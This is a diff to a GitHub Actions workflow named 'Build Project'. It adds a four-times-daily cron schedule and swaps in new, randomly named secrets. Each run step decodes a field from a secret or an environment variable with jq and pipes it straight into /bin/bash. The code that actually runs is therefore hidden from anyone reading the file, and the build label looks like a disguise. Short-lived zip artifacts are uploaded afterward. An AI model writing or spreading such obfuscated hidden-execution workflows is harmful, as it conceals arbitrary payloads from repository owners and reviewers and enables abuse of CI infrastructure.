@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,19 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          kl88058: ${{ secrets.kl88058 }}
+          bl66737: ${{ secrets.bl66737 }}
         run: |
-          printf '%s' "$kl88058" | jq -r .b358 | /bin/bash
-          printf '%s' "$x64" | jq -r .mt9365 | /bin/bash
-          printf '%s' "$bydnr404" | jq -r .jwgbp663 | /bin/bash
-          echo $i0 | jq -r .woz98 | /bin/bash
-          echo $yt0 | jq -r .f70906 | /bin/bash
-          printf '%s' "$ue2021" | jq -r .wld24846 | /bin/bash
-          printf '%s' "$j02063" | jq -r .cnieg11340 | /bin/bash
+          printf '%s' "$bl66737" | jq -r .vem0 | /bin/bash
+          echo $ke250 | jq -r .wy889 | /bin/bash
+          printf '%s' "$ps5" | jq -r .xti4270 | /bin/bash
+          printf '%s' "$xqh2" | jq -r .iootk387 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 2IxYVrJj
+          name: FjnrIRHC
           path: "*.zip"
           retention-days: 1
